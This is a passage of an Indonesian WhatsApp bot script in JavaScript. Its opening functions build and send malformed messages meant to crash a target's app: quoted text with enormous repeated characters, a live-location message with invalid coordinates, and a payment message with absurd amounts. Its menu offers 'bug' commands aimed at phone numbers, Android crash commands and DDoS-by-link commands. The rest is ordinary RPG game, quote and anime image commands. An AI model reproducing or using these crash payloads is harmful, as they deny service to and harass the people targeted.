          'sequenceNumber': '0',
          'jpegThumbnail': ''
        }
      }
    }
}), { userJid: target, quoted: tytyd });
await alifatah.relayMessage(target, lokasii.message, { participant: { jid: target }, messageId: lokasii.key.id });
}

async function mampuss(target, reset) {
  var messageContent = generateWAMessageFromContent(target, proto.Message.fromObject({
    'extendedTextMessage': {
      'text': '.',
      'contextInfo': {
        'stanzaId': target,
        'participant': target,
        'quotedMessage': {
          'conversation': '؂ن؃؄ٽ؂ن؃؄ٽ' + 'ꦾ'.repeat(800000000000)
        },
        'disappearingMode': {
          'initiator': "CHANGED_IN_CHAT",
          'trigger': "CHAT_SETTING"
        }
      },
      'inviteLinkGroupTypeV2': "DEFAULT"
    }
}), { userJid: target, quoted: reset });
await alifatah.relayMessage(target, messageContent.message, { participant: { jid: target }, messageId: messageContent.key.id });
}
async function gitudoang(target, ahayy) {
 var ezzdekku = generateWAMessageFromContent(target, proto.Message.fromObject({
    'paymentInviteMessage': {
      'serviceType': "UPI",
      'expiryTimestamp': Date.now() + 86400000
    }
}), { userJid: target, quoted: ahayy });
await alifatah.relayMessage(target, messageContent.message, { participant: { jid: target }, messageId: messageContent.key.id });
}

async function ngeloc(target, kuwoted) {
var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
viewOnceMessage: {
message: {
  "liveLocationMessage": {
    "degreesLatitude": "p",
    "degreesLongitude": "p",
    "caption": `✳️࿆᷍🥷᜴͆ժׁׅ݊ꫀׁׅܻ݊ᥣׁׅ֪tׁׅɑׁׅ•ᝯׁ֒ꭈׁׅɑׁׅׅ꯱hׁׅ֮̿╮⭑ ☠️⃰͜͡؜ĐɆⱠ₮₳⃟🔥᜴▴𝒟𝐸𝐿𝒯𝒜𝒞𝑅𝒜𝒮𝐻ཀ͜͡😈⃟╮.xp`+"ꦾ".repeat(50000),
    "sequenceNumber": "0",
    "jpegThumbnail": ""
     }
  }
}
}), { userJid: target, quoted: kuwoted })
await alifatah.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id })
}

const force = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
'message': {
"interactiveMessage": { 
"header": {
"hasMediaAttachment": true,
"jpegThumbnail": fs.readFileSync(`./V5Media/theme/bug.png`)
},
"nativeFlowMessage": {
"buttons": [
{
"name": "review_and_pay",
"buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"✳️᜴࿆͆᷍ĐɆⱠ₮₳ ₵Ɽ₳₴Ⱨ̿╮⭑ ☠️⃰͜͡؜ĐɆⱠ₮₳⃟🔥᜴#DELTA999ཀ͜͡😈⃟╮\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
}
]
}
}
}
}

function msToTime(duration) {
var milliseconds = parseInt((duration % 1000) / 100),
seconds = Math.floor((duration / 1000) % 60),
minutes = Math.floor((duration / (1000 * 60)) % 60),
hours = Math.floor((duration / (1000 * 60 * 60)) % 24)

hours = (hours < 10) ? "0" + hours : hours
minutes = (minutes < 10) ? "0" + minutes : minutes
seconds = (seconds < 10) ? "0" + seconds : seconds
return hours + " jam " + minutes + " menit " + seconds + " detik"
}
switch (command) {

case "menu": {
let documents = [doc1, doc2, doc3, doc4, doc5, doc6];
let docs = pickRandom(documents);
let me = m.sender;
let memek = (`*乂  I N F O - B O T*  

◦  *Bot Name* : ${global.namabot}
◦  *Script* : alifatahifatahV6 - Only
◦  *Limit* : ${isCreator ? "Unlimited Only" : `${db.data.users[m.sender].limit}`}
◦  *Runtime* : ${runtime(process.uptime())}

If you find a bug or want a premium upgrade, please contact the owner.
${readmore}
乂 𝗔𝗟𝗟 𝗠𝗘𝗡𝗨

乂  𝗠𝗘𝗡𝗨 - 𝗢𝗪𝗡𝗘𝗥

  • ${prefix}addprem
  • ${prefix}delprem
  • ${prefix}addsaldo
  • ${prefix}minsaldo
  • ${prefix}addlimit
  • ${prefix}updateinfo
  • ${prefix}setppbotpanjang
  • ${prefix}addmoney
  • ${prefix}addcase
  • ${prefix}delcase
  • ${prefix}statusaudio
  • ${prefix}resetlimit
  • ${prefix}upsw
  • ${prefix}mode public/self
  • ${prefix}clearall
  • ${prefix}updateinfo

乂  𝗠𝗘𝗡𝗨 - 𝗚𝗥𝗢𝗨𝗣

  • ${prefix}addmember
  • ${prefix}hidetag
  • ${prefix}kick
  • ${prefix}delete
  • ${prefix}pppanjanggc
  • ${prefix}setppgroup
  • ${prefix}setnamegc
  • ${prefix}setdesc
  • ${prefix}cekmember
  • ${prefix}cekasalmember
  • ${prefix}getidgrup
  • ${prefix}getdesk
  • ${prefix}tagall
  • ${prefix}nfinp
  • ${prefix}noftication
  • ${prefix}rules
  • ${prefix}tagadmin

乂 𝗠𝗘𝗡𝗨 - 𝗤𝗨𝗢𝗧𝗘𝗦

  • ${prefix}gombal
  • ${prefix}quotesislami
  • ${prefix}quotesbacot
  • ${prefix}quotesbucin
  • ${prefix}quotessindiran
  • ${prefix}quotespantun
  • ${prefix}quoteshacker
  • ${prefix}cekmember

乂 𝗠𝗘𝗡𝗨 - 𝗧𝗜𝗞𝗧𝗢𝗞

  • ${prefix}tiktokgirl
  • ${prefix}tiktoknukhty
  • ${prefix}tiktoksantuy
  • ${prefix}tiktokpanrika
  • ${prefix}tiktoknotnot
  • ${prefix}tiktokghea
  • ${prefix}tiktokkayes
  • ${prefix}tiktokbocil

乂 𝗠𝗘𝗡𝗨 - 𝗥𝗔𝗡𝗗𝗢𝗠

  • ${prefix}chinese
  • ${prefix}hijab
  • ${prefix}indo
  • ${prefix}japanese
  • ${prefix}korean
  • ${prefix}malay
  • ${prefix}randomgirl
  • ${prefix}random2
  • ${prefix}thai
  • ${prefix}vietnamese

乂 𝗠𝗘𝗡𝗨 - 𝗥𝗣𝗚

  • ${prefix}craftatm
  • ${prefix}polisi
  • ${prefix}sell
  • ${prefix}jualstone
  • ${prefix}joinrpg
  • ${prefix}inventori
  • ${prefix}tarikuang
  • ${prefix}nabung
  • ${prefix}merampok
  • ${prefix}bank

乂 𝗠𝗘𝗡𝗨 - 𝗣𝗔𝗡𝗘𝗟 

  • ${prefix}1gb < user,nomor >
  • ${prefix}2gb < user,nomor >
  • ${prefix}3gb < user,nomor >
  • ${prefix}4gb < user,nomor >
  • ${prefix}5gb < user,nomor >
  • ${prefix}6gb < user,nomor >
  • ${prefix}7gb < user,nomor >
  • ${prefix}8gb < user,nomor >
  • ${prefix}unli < user,nomor >
  
乂 𝗠𝗘𝗡𝗨 - 𝗣𝗥𝗜𝗠𝗕𝗢

  • ${prefix}wangy
  • ${prefix}sangecek
  • ${prefix}kapankah
  • ${prefix}cantikcek
  • ${prefix}jomokcek
  • ${prefix}gantengcek
  • ${prefix}rate
  • ${prefix}bagaimanakah
  • ${prefix}bisakah
  • ${prefix}jomokce

乂 𝗠𝗘𝗡𝗨 - 𝗧𝗘𝗦𝗧𝗜

  • ${prefix}testi1 < Testimoni >
  • ${prefix}testi2 < Testimoni >
  • ${prefix}testi3 < Testimoni >
  • ${prefix}testi4 < Testimoni >
  • ${prefix}testi5 < Testimoni >
  • ${prefix}testi6 < Testimoni >
  • ${prefix}testi7 < Testimoni >
  • ${prefix}testi8 < Testimoni >
  • ${prefix}testi9 < Testimoni >
  • ${prefix}testi10 < Testimoni >
  
乂 𝗠𝗘𝗡𝗨 - 𝗜𝗡𝗧𝗘𝗥𝗡𝗘𝗧 
  
  • ${prefix}capcut
  • ${prefix}chatgpt
  • ${prefix}ssweb
  • ${prefix}sswebv2
  • ${prefix}prompt-gpt
  • ${prefix}text2img
  • ${prefix}pinterest

乂 𝗠𝗘𝗡𝗨 - 𝗔𝗡𝗜𝗠𝗘

  • ${prefix}akira
  • ${prefix}akiyama
  • ${prefix}ana
  • ${prefix}asuna
  • ${prefix}ayuzawa
  • ${prefix}boruto
  • ${prefix}chitanda
  • ${prefix}deidara
  • ${prefix}elaina
  • ${prefix}emilia
  • ${prefix}erza
  • ${prefix}fanart
  • ${prefix}genshin
  • ${prefix}gremory
  • ${prefix}hestia
  • ${prefix}hinata
  • ${prefix}husbu
  • ${prefix}icon
  • ${prefix}inori
  • ${prefix}isuzu
  • ${prefix}itachi
  • ${prefix}itori
  • ${prefix}kaga
  • ${prefix}kagura
  • ${prefix}kaguya
  • ${prefix}kakasih
  • ${prefix}kaneki
  • ${prefix}kaori
  • ${prefix}keneki
  • ${prefix}kosaki
  • ${prefix}kotori
  • ${prefix}kuriyama
  • ${prefix}kuroha
  • ${prefix}kurumi
  • ${prefix}loli
  • ${prefix}madara
  • ${prefix}megumin
  • ${prefix}menus
  • ${prefix}mikasa
  • ${prefix}miku
  • ${prefix}minato
  • ${prefix}naruto
  • ${prefix}natsukawa
  • ${prefix}nezuko
  • ${prefix}nishimiya
  • ${prefix}onepiece
  • ${prefix}pokemon
  • ${prefix}rem
  • ${prefix}rize
  • ${prefix}sagiri
  • ${prefix}sakura
  • ${prefix}sasuke
  • ${prefix}shina
  • ${prefix}shinka
  • ${prefix}shizuka
  • ${prefix}shota
  • ${prefix}simp
  • ${prefix}tomori
  • ${prefix}toukachan
  • ${prefix}tsunade
  • ${prefix}yatogami
  • ${prefix}yuki

乂 𝗠𝗘𝗡𝗨 - 𝗕𝗨𝗚 𝗘𝗠𝗢𝗝𝗜

  • ${prefix}🗿 628xxxx
  • ${prefix}🔥 628xxxx
  • ${prefix}⚡ 628xxxx
  • ${prefix}🤣 628xxxx
  • ${prefix}👺 628xxxx
  • ${prefix}🌹 628xxxx
  • ${prefix}💀 628xxxx
  • ${prefix}👿 628xxxx
  
乂 𝗠𝗘𝗡𝗨 - 𝗕𝗨𝗚 𝗡𝗨𝗠𝗕𝗘𝗥

  • ${prefix}gasbugalifatah 628xxxx,Jumlah
  • ${prefix}oemji 628xxxx,Jumlah
  • ${prefix}lawack 628xxxx,Jumlah

乂 𝗠𝗘𝗡𝗨 - 𝗕𝗨𝗚 𝗪𝗔𝗞𝗧𝗨

  • ${prefix}alifatahgas 628xxxx,Waktu
  • ${prefix}kasar 628xxxx,Waktu
  • ${prefix}lembu 628xxxx,Waktu
  • ${prefix}wak 628xxxx,Waktu

乂 𝗠𝗘𝗡𝗨 - 𝗕𝗨𝗚 𝗔𝗡𝗗𝗥𝗢𝗜𝗗 

  • ${prefix}out-android 628xxxx
  • ${prefix}out-external 628xxxx
  • ${prefix}out-internal 628xxxx

乂 𝗠𝗘𝗡𝗨 - 𝗗𝗗𝗢𝗦

  • ${prefix}ddos-hent Link
  • ${prefix}ddos-mix Link
  • ${prefix}ddos-lol Link

乂 𝗠𝗘𝗡𝗨 - 𝗗𝗢𝗪𝗡𝗟𝗢𝗔𝗗

  • ${prefix}play
  • ${prefix}ytmp4
  • ${prefix}instagram
  • ${prefix}tiktokaudio
  • ${prefix}ttsearch
  • ${prefix}tiktok

乂 𝗠𝗘𝗡𝗨 - 𝗧𝗘𝗫𝗧 𝗨𝗡𝗕

  • ${prefix}textunbanv1
  • ${prefix}textunbanv2
  • ${prefix}textunbanv3
  • ${prefix}textunbanv4
  • ${prefix}textunbanv5
  • ${prefix}textunbanv6
  • ${prefix}textunbanv7
  • ${prefix}textunbanv8
  • ${prefix}textunbanv9
  • ${prefix}textunbanv10
  • ${prefix}textunbanv11
  • ${prefix}textunbanv12
  • ${prefix}textunbanv13
  • ${prefix}textunbanv14
  • ${prefix}textunbanv15
  • ${prefix}textunbanv16
  • ${prefix}textunbanv17
  • ${prefix}textunbanv18
  • ${prefix}textunbanv19
  • ${prefix}textunbanv20
  • ${prefix}textunbanv21
`)
alifatah.sendMessage(m.chat, { 
    document: fs.readFileSync('./package.json'), 
    jpegThumbnail: ppuser,
    fileName: ucapanWaktu,
    mimetype: docs,
    fileLength: 99999999999999,
    pageCount: "100",
    caption: memek,
      contextInfo: {
               forwardingScore: global.jumhal,
               externalAdReply: {
               containsAutoReply: true,
               mediaType: 1,
               mediaUrl: ppuser,
               renderLargerThumbnail: true,
               showAdAttribution: true,
               sourceUrl: '',
               thumbnailUrl: 'https://telegra.ph/file/b29e8a8622646929be26d.jpg',
               title: `HALO ${pushname}`,
               body: ucapanWaktu}}
            })
        }
alifatah.sendMessage(m.chat, {
audio: fs.readFileSync('./V5Media/audio/ucap.mp3'), mimetype:'audio/mpeg', ptt: false,
    contextInfo: {
        externalAdReply: {
            containsAutoReply: true,
            mediaType: 1,
            mediaUrl: '',
            renderLargerThumbnail: true,
            showAdAttribution: true,
            sourceUrl: 'https://www.youtube.com/@Fauzialifatah',
            thumbnailUrl: 'https://telegra.ph/file/b29e8a8622646929be26d.jpg',
            title: `ʜᴀʟʟᴏ ᴋᴀᴋ ɪɴɪ ᴀᴅᴀʟᴀʜ ᴍᴇɴᴜ ᴜᴛᴀᴍᴀɴʏᴀ `,
            body: ``,
        }
    }
}, { quoted: fcall})  
        break
//=======================================================//
case 'craftatm':{
let user = global.db.data.users[m.sender]
if (user.atm > 0) return reply('Kamu sudah memilik ini')
if(user.emerald < 3 || user.money < 10000 || user.diamond < 6) return reply(`Barang tidak cukup!\nUntuk membuat atm. Kamu memerlukan :${user.money < 10000 ? `\n${10000 - user.money} Money 💹` : ''}${user.emerald < 3 ? `\n${3 - user.emerald} Emerald ❇️` : ''}${user.diamond < 6 ? `\n${6 - user.diamond} Diamond 💎` : ''}`)
            user.emerald -= 3
            user.money -= 10000
            user.diamond -= 6
            user.atm += 1
            user.fullatm = Infinity
            reply("Sukses membuat 1 Atm 💳")
            }
            break

case 'polisi':{
if (!m.isGroup) return reply(mess.group)
let __timers = (new Date - global.db.data.users[m.sender].lastngojek)
    let _timers = (300000 - __timers)
    let order = global.db.data.users[m.sender].ojekk
    let timers = clockString(_timers) 
let name = alifatah.getName(m.sender)
    let user = global.db.data.users[m.sender]
    
     if (new Date - global.db.data.users[m.sender].lastngojek > 300000) {
let randomaku1 = `${Math.floor(Math.random() * 10)}`
let randomaku2 = `${Math.floor(Math.random() * 10)}`
let randomaku4 = `${Math.floor(Math.random() * 5)}`
let randomaku3 = `${Math.floor(Math.random() * 10)}`
let randomaku5 = `${Math.floor(Math.random() * 10)}`

.trim()

let rbrb1 = (randomaku1 * 2)
let rbrb2 = (randomaku2 * 10) 
let rbrb3 = (randomaku3 * 1)
let rbrb4 = (randomaku4 * 15729)
let rbrb5 = (randomaku5 * 120)

var zero1 = `${rbrb1}`
var zero2 = `${rbrb2}`
var zero3 = `${rbrb3}`
var zero4 = `${rbrb4}`
var zero5 = `${rbrb5}`

var dimas = `
👮Mengejar Pencuri....
`

var dimas2 = `
👮Menangkap pencuri....
`

var dimas3 = `
🚔Membawa ke kantor polisi\nDan di penjara
`

var dimas4 = `
➕ 💹Menerima gaji....
`

var hsl = `
*—[ Hasil Polisi ${name} ]—*
 ➕ 💹 Uang = [ ${zero4} ]
 ➕ ✨ Exp = [ ${zero5} ] 		 
 ➕ 😍 Order Selesai = +1
➕  📥Total Order Sebelumnya : ${order}

${namabot}
`

var dimas5 = `
*👋HALLO, Waktunya misi Polisi lagi kak....*
`

global.db.data.users[m.sender].money += rbrb4
global.db.data.users[m.sender].exp += rbrb5
global.db.data.users[m.sender].ojekk += 1


setTimeout(() => {
                     setTimeout(() => {
                     reply(`${dimas5}`)
                      }, 79200000)

                     reply(`${hsl}`)
                     }, 27000) 
               
                     setTimeout(() => {
                     reply(`${dimas4}`)
                      }, 25000)
                
                     setTimeout(() => {
                     reply(`${dimas3}`)
                     }, 20000) 
                        
                     setTimeout(() => {
                     reply(`${dimas2}`)
                     }, 15000) 
                    
                     setTimeout(() => {
                     reply(`${dimas}`)
                     }, 10000) 
                     
                     setTimeout(() => {
                     reply('🔍Mencari Lokasi.....')
                     }, 0) 
  user.lastngojek = new Date * 1
    } else alifatah.reply(m.chat, `Sepertinya Anda Sudah Kecapean Silahkan Istirahat Dulu sekitar\n🕔 ${time2}`, m)
}
break
/*case 'buy': case 'sell': {
function isNumber(number) {
    if (!number) return number
    number = parseInt(number)
    return typeof number == 'number' && !isNaN(number)
}

function capitalize(word) {
  return word.charAt(0).toUpperCase() + word.substr(1)
}
const items = {
    buy: {
        limit: {
            exp: 9999
        },
        chip: {
        	money: 1000000
        },
        exp: {
        	money: 1000
        },
        potion: {
            money: 1250
        },
        trash: {
            money: 40
        },
        wood: {
            money: 700
        },
        rock: {
            money: 850
        },
        string: {
            money: 400
        },
        iron: { 
        	money: 3000
        },
        diamond: {
            money: 500000
        },
        emerald: {
            money: 100000
        },
        gold: {
            money: 100000
        },
        common: {
            money: 2000
        },
        uncommon: {
            money: 20000
        },
        mythic: {
            money: 75000
        },
        legendary: {
            money: 200000
        },
        petfood: {
            money: 3500
        },
        pet: {
            money: 120000
        },
        anggur: {
            money: 2000
        },
        apel: {
            money: 2000
        },
        jeruk: {
            money: 2000
        },
        mangga: {
            money: 2000
        },
        pisang: {
        	money: 2000
        },
        bibitanggur: {
            money: 2000
        },
        bibitapel: {
            money: 2000
        },
        bibitjeruk: {
            money: 2000
        },
        bibitmangga: {
            money: 2000
        },
        bibitpisang: {
            money: 2000
        },
        umpan: {
        	money: 5000
        }     
    },
    sell: {
        limit: {
            exp: 999
        },
        exp: {
        	money: 1
        },
        chip: {
        	money: 1000000
        },
        potion: {
            money: 625
        },
        trash: {
            money: 20
        },
        wood: {
            money: 350
        },
        rock: {
            money: 425
        },
        string: {
            money: 200
        },
        iron: { 
        	money: 1500
        },
        diamond: {
            money: 250000
        },
        emerald: {
            money: 50000
        },
        gold: {
            money: 50000
        },
        common: {
            money: 1000
        },
        uncommon: {
            money: 10000
        },
        mythic: {
            money: 37500
        },
        legendary: {
            money: 100000
        },
        petfood: {
            money: 1750
        },
        pet: {
            money: 60000
        },
        anggur: {
            money: 1000
        },
        apel: {
            money: 1000
        },
        jeruk: {
            money: 1000
        },
        mangga: {
            money: 1000
        },
        pisang: {
        	money: 1000
        },
        bibitanggur: {
            money: 1000
        },
        bibitapel: {
            money: 1000
        },
        bibitjeruk: {
            money: 1000
        },
        bibitmangga: {
            money: 1000
        },
        bibitpisang: {
            money: 1000
        },
        umpan: {
        	money: 2500
        }
    }
}

    const item = (args[0] || '').toLowerCase()
    if (!item.match('limit') && global.db.data.chats[m.chat].rpg == false && m.isGroup) return dfail('rpg', m, alifatah)
    let user = global.db.data.users[m.sender]
    const listItems = Object.fromEntries(Object.entries(items[command.toLowerCase()]).filter(([v]) => v && v in user))
    let text = ''
    let footer = ''
    let image = ''
    let buttons = ''
    text = (command.toLowerCase() == 'buy' ?
(`
*${decor.htki} 𝙱𝚄𝚈𝙸𝙽𝙶 ${decor.htka}*
`.trim()) : 
(`
*${decor.htki} 𝚂𝙴𝙻𝙻𝙸𝙽𝙶 ${decor.htka}*
`.trim())
)
    footer = (command.toLowerCase() == 'buy' ?
(`
🛒 List Items :
${Object.keys(listItems).map((v) => {
        let paymentMethod = Object.keys(listItems[v]).find(v => v in user)
        return `➠ 1 ${rpg.emoticon(v)} ${capitalize(v)} ﹫ ${listItems[v][paymentMethod]} ${rpg.emoticon(paymentMethod)}${capitalize(paymentMethod)}`.trim()
    }).join('\n')}
–––––––––––––––––––––––––
💁🏻‍♂ ᴛɪᴩ :
➠ ᴛᴏ ʙᴜʏ ɪᴛᴇᴍs:
${command} [item] [quantity]
▧ ᴇxᴀᴍᴩʟᴇ:
${command} potion 10
`.trim()) : 
(`
🛒 List Items :
${Object.keys(listItems).map((v) => {
        let paymentMethod = Object.keys(listItems[v]).find(v => v in user)
        return `➠ 1 ${rpg.emoticon(v)} ${capitalize(v)} ﹫ ${listItems[v][paymentMethod]} ${rpg.emoticon(paymentMethod)}${capitalize(paymentMethod)}`.trim()
    }).join('\n')}
–––––––––––––––––––––––––
💁🏻‍♂ ᴛɪᴩ :
➠ ᴛᴏ sᴇʟʟ ɪᴛᴇᴍs:
${command} [item] [quantity]
▧ ᴇxᴀᴍᴩʟᴇ:
${command} potion 10
`.trim())
)
    
    const total = Math.floor(isNumber(args[1]) ? Math.min(Math.max(parseInt(args[1]), 1), Number.MAX_SAFE_INTEGER) : 1) * 1
    if (!listItems[item]) return reply(footer)
    if (command.toLowerCase() == 'buy') {
        let paymentMethod = Object.keys(listItems[item]).find(v => v in user)
        if (user[paymentMethod] < listItems[item][paymentMethod] * total) return reply(`Kamu membutuhkan *${(listItems[item][paymentMethod] * total) - user[paymentMethod]}* ${capitalize(paymentMethod)} ${rpg.emoticon(paymentMethod)} Lagi, Untuk Membeli *${total}* ${capitalize(item)} ${rpg.emoticon(item)}. Kamu hanya memiliki *${user[paymentMethod]}* ${capitalize(paymentMethod)} ${rpg.emoticon(paymentMethod)}.`)
        user[paymentMethod] -= listItems[item][paymentMethod] * total
        user[item] += total
        return reply(`Sukses Membeli *${total} ${capitalize(item)} ${rpg.emoticon(item)}*, Seharga *${listItems[item][paymentMethod] * total} ${capitalize(paymentMethod)} ${rpg.emoticon(paymentMethod)}*`)
    } else {
    	let paymentMethot = Object.keys(listItems[item]).find(v => v in user)
        if (user[item] < total) return reply(`You don't have enough *${capitalize(item)} ${rpg.emoticon(item)}* to sell, you only have ${user[item]} items`)
        user[item] -= total
        user[paymentMethot] += listItems[item][paymentMethot] * total
        return reply(`Sukses Menjual *${total} ${capitalize(item)} ${rpg.emoticon(item)}*, Seharga *${listItems[item][paymentMethot] * total} ${capitalize(paymentMethot)} ${rpg.emoticon(paymentMethot)}*`)
    }
}
break

case 'mining': case 'mine':{
if (!isPetualang) return m.reply('Kamu belum terdaftar dalam database rpg silahkan ketik .joinrpg')
if (isCekDarah < 1) return m.reply(`Kamu Lelah!, Coba Sembuhkan Menggunakan Ramuan`) 
let besi = [1,2,5,0,3,0,1,1,4,1,5,0,0]
let emas = [0,1,2,3,0,0,0,1,1,0,0,2]
let emerald = [0,0,1,0,0,1,0,2,1,0,0,1]
var besinya = besi[Math.floor(Math.random() * besi.length)]
var emasnya = emas[Math.floor(Math.random() * emas.length)]
var emeraldnya = emerald[Math.floor(Math.random() * emerald.length)]
setTimeout( async () => {
let caption = `_MINING RESULT_\n\n*Iron* : ${besinya}\n*Gold* : ${emasnya}\n*Emerald* : ${emeraldnya}`
await alifatah.sendMessage(m.chat, {image:{ url : 'https://telegra.ph/file/d17479f0a56cc52826101.jpg'}, caption: caption}, {quoted:fcall})
}, 7000)
setTimeout( async () => {
await alifatah.sendMessage(m.chat, `@${pushname} Otw Mining`, m) 
}, 1500)
kurangDarah(m.sender, 10)
addBesi(m.sender, besinya)
addEmas(m.sender, emasnya)
addEmerald(m.sender, emeraldnya) 
}
break*/

 case 'sell': case 'sel': case 'jual':{
if (!isPetualang) return reply('Kamu belum terdaftar dalam database rpg silahkan ketik .joinrpg')
 if (!text) return reply(`Mau jual apa?\n- fish\n- chicken\n- rabbit\n- sheep\n- cow\n- elephant\n- iron\n- gold\n- emerald\n\nExample : ${prefix + command} fish 2`)
var anu = args[1]
 if (args[0] === 'fish'){
 if (isIkan < anu) return reply(`Anda Tidak Memiliki Cukup Ikan Untuk Transaksi Ini`)
 if (!args[1]) return reply(`Example : ${prefix + command} fish 2\n 1 Fish = 1500 Money`)
 kurangIkan(m.sender, anu)
let monaynya = 1500 * anu
 users.balance += monaynya
setTimeout( async () => {
 reply(`Transaksi Berhasil ✅\n*Sisa uang* : Rp ${Func.formatter(users.balance)}\n*Sisa Ikan Fish : ${getIkan(m.sender)}`)
}, 2000) 
 } else
 if (args[0] === 'chicken'){
 if (isAyam < anu) return reply(`Anda Tidak Memiliki Cukup Ayam Untuk Transaksi Ini`)
 if (!args[1]) return reply(`Example : ${prefix + command} chicken 2\n 1 Chicken = 2500 Money`)
 kurangAyam(m.sender, anu)
let monaynya = 2500 * anu
 users.balance += monaynya
setTimeout( async () => {
reply(`Transaksi Berhasil ✅\n*Sisa uang* : Rp ${Func.formatter(users.balance)}\n*Sisa Ayam* : ${getAyam(m.sender)}`)
}, 2000) 
 } else
 if (args[0] === 'rabbit'){
 if (isKelinci < anu) return reply(`Anda Tidak Memiliki Cukup Kelinci Untuk Transaksi Ini`)
 if (!args[1]) return reply(`Example : ${prefix + command} rabbit 2\n 1 Rabbit = 3000 Money`)
 kurangKelinci(m.sender, anu)
let monaynya = 3000 * anu
 users.balance += monaynya
setTimeout( async () => {
 reply(`Transaksi Berhasil ✅\n*Sisa uang* : Rp ${Func.formatter(users.balance)}\n*Sisa kelinci* : ${getKelinci(m.sender)}`)
}, 2000) 
 } else
 if (args[0] === 'sheep'){
 if (isDomba < anu) return reply(`Anda Tidak Memiliki Cukup Domba Untuk Transaksi Ini`)
 if (!args[1]) return reply(`Example : ${prefix + command} domba 2\n 1 Sheep = 5000 money`)
 kurangDomba(m.sender, anu)
let monaynya = 5000 * anu
 users.balance += monaynya
setTimeout( async () => {
 reply(`Transaksi Berhasil ✅\n*Sisa uang* : Rp ${Func.formatter(users.balance)}\n*Sisa domba* : ${getDomba(m.sender)}`)
}, 2000) 
 } else
 if (args[0] === 'cow'){
 if (isSapi < anu) return reply(`Anda Tidak Memiliki Cukup Sapi Untuk Transaksi Ini`)
 if (!args[1]) return reply(`Example : ${prefix + command} cow 2\n 1 Cow = 10000 Money`)
 kurangSapi(m.sender, anu)
let monaynya = 10000 * anu
 users.balance += monaynya
setTimeout( async () => {
 reply(`Transaksi Berhasil ✅\n*Sisa uang* : Rp ${Func.formatter(users.balance)}\n*Sisa sapi* : ${getSapi(m.sender)}`)
}, 2000) 
 } else
 if (args[0] === 'elephant'){
 if (isGajah < anu) return reply(`Anda Tidak Memiliki Cukup Gajah Untuk Transaksi Ini`)
 if (!args[1]) return reply(`Example : ${prefix + command} elephant 2\n 1 Elephant = 15000 Money`)
 kurangGajah(m.sender, anu)
let monaynya = 15000 * anu
 users.balance += monaynya
setTimeout( async () => {
 reply(`Transaksi Berhasil ✅\n*Sisa uang* : Rp ${Func.formatter(users.balance)}\n*Sisa gajah* : ${getGajah(m.sender)}`)
}, 2000) 
 } else
 if (args[0] === 'iron'){
 if (isBesi < anu) return reply(`Anda Tidak Memiliki Cukup Besi Untuk Transaksi Ini`)
 if (!args[1]) return reply(`Example : ${prefix + command} iron 2\n 1 Iron = 15000 Money`)
 kurangBesi(m.sender, anu)
let monaynya = 16000 * anu
 users.balance += monaynya
setTimeout( async () => {
 reply(`Transaksi berhasil ✅\n*Sisa uang* : Rp ${Func.formatter(users.balance)}\n*Sisa besi* : ${getBesi(m.sender)}`)
}, 2000) 
 } else
 if (args[0] === 'gold'){
 if (isEmas < anu) return reply(`Anda Tidak Memiliki Cukup Emas Untuk Transaksi Ini`)
 if (!args[1]) return reply(`Example : ${prefix + command} gold 2\n 1 Gold = 50000 Money`)
 kurangEmas(m.sender, anu)
let monaynya = 50000 * anu
 users.balance += monaynya
setTimeout( async () => {
 reply(`Transaksi berhasil ✅\n*Sisa uang* : Rp ${Func.formatter(users.balance)}\n*Sisa emas* : ${getEmas(m.sender)}`)
}, 2000) 
 } else
 if (args[0] === 'emerald'){
 if (isEmerald < anu) return reply(`Anda Tidak Memiliki Cukup Zamrud Untuk Transaksi Ini`)
 if (!args[1]) return reply(`Example : ${prefix + command} emerald 2\n 1 Emerald = 100000 Money`)
 kurangEmerald(m.sender, anu)
let monaynya = 100000 * anu
 users.balance += monaynya
setTimeout( async () => {
 reply(`Transaksi berhasil ✅\n*Sisa uang* : Rp ${Func.formatter(users.balance)}\n*Sisa zamrud* : ${getEmerald(m.sender)}`)
}, 2000) 
 } else { 
 reply(`Mau jual apa?\n- fish\n- chicken\n- rabbit\n- sheep\n- cow\n- elephant\n- iron\n- gold\n- emerald\n\nExample : ${prefix + command} fish 2`)
 }

 }
 break

case 'jualstone':{
if (!isPetualang) return reply('Kamu belum terdaftar dalam database rpg silahkan ketik .joinrpg')
if(!text) return reply(`Kirim perintah ${prefix + command} jumlah yg ingin di jual\n\nContoh ${prefix + command} 10`)
bayar = args.join(' ')
const hargaStone = 900
const hasil4 = bayar * hargaStone
if ( getMiningstone(m.sender) <= 1 ) return reply(`Maaf ${pushname} stone kamu belum cukup, minimal 2 stone`)
if ( getMiningstone(m.sender) >= 1 ) {
jualstone(m.sender, bayar)
users.balance += hasil4
awaitreply(`*「 PENJUALAN BERHASIL 」*${enter}${enter}*Jumlah Batu dijual:* ${bayar}${enter}*Uang didapat:* ${hasil4}${enter}${enter}*Sisa Batu:* ${getMiningstone(m.sender)}${enter}*Sisa uang:* ${checkATMuser(m.sender)}`)
}
}
break

case 'joinrpg':{
if (isPetualang) return reply('Kamu Telah join sebelumnya')
reqXp = 5000 * (Math.pow(2, getLevelingLevel(m.sender)) - 1)
_petualang.push(m.sender)
addInventoriDarah(m.sender, DarahAwal)
addInventori(m.sender)
addInventoriBuruan(m.sender)
fs.writeFileSync('./src/rpg/inventory.json', JSON.stringify(_petualang))
addLevelingId(m.sender) 
let itu = 'https://telegra.ph/file/a4ec01498e764ae42c8c4.jpg'
alifatah.sendMessage(m.chat, {image:{url: itu}, caption: 'Sukses join Rpg games' }, {quoted:m})
}
break

case 'inv': case 'inventori': case 'inventory': case 'profile':{
